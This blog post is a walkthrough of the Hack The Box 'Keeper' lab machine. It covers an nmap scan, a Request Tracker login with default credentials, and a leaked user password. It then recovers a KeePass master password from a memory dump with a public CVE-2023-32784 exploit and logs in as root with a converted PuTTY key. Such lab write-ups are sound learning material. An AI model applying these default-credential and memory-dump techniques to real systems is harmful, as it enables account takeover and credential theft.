---
layout: post
title: "Keeper - HTB"
date: 2024-02-13
---

# HTB Keeper Write Up
![HTB Keeper](keeper_imgs_20240213/machine_info.png "Keeper")

## Network Scan

<details>
<summary><b>Nmap scan result</b></summary>
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

## Investigation
Accessing the http service, it just prints a redirection message to tickets.keeper.htb/rt vhost.
![Http server no vhost](keeper_imgs_20240213/http_server_no_vhost.png "Http server no vhost")   

### tickets.keeper.htb
Best Practical Request Tracker software. There is no public exploit to recent vulnerabilities
This service comes with default credentials
```
User: root
Pass: password
```

It is possible to log in with default credentials.
![Request tracker page](keeper_imgs_20240213/request_tracker_page.png "Request tracker page")

Issue tracker software normally contains sensitive information. Usually on the issues but they can be useful in finding users list, information about local services, etc.
On this server, there were only two users:
![Request tracker user list](keeper_imgs_20240213/request_tracker_user_list.png "Request tracker user list")
lnorgaard user has the password on the description
![lnorgaard password](keeper_imgs_20240213/lnorgaard_password.png "lnorgaard password")

Checking if it's possible to log in on ssh with this user and it's possible.

### lnorgaard
RT30000.zip file on home, containing two files
```
$ unzip -l RT30000.zip 
Archive:  RT30000.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
253395188  2023-05-24 12:51   KeePassDumpFull.dmp
     3630  2023-05-24 12:51   passcodes.kdbx
---------                     -------
253398818                     2 files
```

Looking into the files
```
$ file KeePassDumpFull.dmp 
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type
```
```
$ file passcodes.kdbx 
passcodes.kdbx: Keepass password database 2.x KDBX
```

There is a [KeePass vulnerability][CVE-2023-32784] that it is possible to retrieve passwords from a memory dump.
Using a public exploit from [vdhoney][keepass-password-dumper] it's possible to find a list with possible passwords
```
$ dotnet run ~/keeper/KeePassDumpFull.dmp
... SNIP ...
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```
This means that the first character is unknown `●` and the following are possible 16-second characters appended on beginning of `dgrød med fløde`.
Using Google Translate to identify the language, to later perform a smart brute force on the character set. The language was identified as Danish.
When doing this, it was corrected to `rødgrød med fløde`. This is the correct password for passcodes.kdbx

There was a root user with both password and PuTTY SSH key pair
![Root SSH](keeper_imgs_20240213/root_ssh.png "Root SSH")

[A PuTTY ssh key can be converted to openssh format][ssh-key-types-convert-ppk].
Following the guide to get the private key and log in as the root
```
$ ssh -i root.id_rsa root@10.10.11.227
$ id
uid=0(root) gid=0(root) groups=0(root)
```

[CVE-2023-32784]: <https://nvd.nist.gov/vuln/detail/CVE-2023-32784> "CVE-2023-32784"
[keepass-password-dumper]: <https://github.com/vdohney/keepass-password-dumper> "keepass-password-dumper"
[ssh-key-types-convert-ppk]: <https://www.baeldung.com/linux/ssh-key-types-convert-ppk> "ssh-key-types-convert-ppk"
